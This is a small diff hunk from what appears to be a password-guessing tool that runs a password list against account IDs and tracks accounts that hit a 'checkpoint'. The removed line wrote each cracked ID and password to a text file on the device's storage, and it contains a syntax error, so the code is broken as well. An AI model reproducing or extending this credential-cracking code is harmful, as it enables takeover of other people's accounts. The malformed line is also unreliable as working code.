@@ -508,7 +508,6 @@ def ffb(ids,names,passlist):
                                 break
                         elif 'checkpoint' in KING:
                                 if 'y' in pcp:
-                                        open('/sdcard/KING-CP.txt', 'a').write(ids+'|'+pas+'|'\n')
                                         cps.append(ids)
                                         break
                                 else:
